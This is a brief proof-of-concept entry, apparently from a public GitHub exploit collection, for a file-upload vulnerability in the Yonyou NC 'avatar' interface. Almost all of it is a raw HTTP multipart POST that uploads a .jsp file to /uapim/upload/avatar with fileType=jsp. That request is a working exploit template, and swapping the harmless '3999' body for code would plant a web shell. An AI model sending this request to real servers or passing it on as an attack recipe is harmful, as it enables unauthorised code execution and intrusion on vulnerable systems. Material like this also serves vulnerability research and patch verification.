# yonyounc_avatar_fileupload

from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-avatar%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

2024.4.22 @2 

```
POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
User-Agent: Mozilla/5.0 

------WebKitFormBoundaryEXmnamw5gVZG9KAQ
Content-Disposition: form-data; name="file"; filename="111.jsp"
Content-Type: application/octet-stream

3999
------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
```
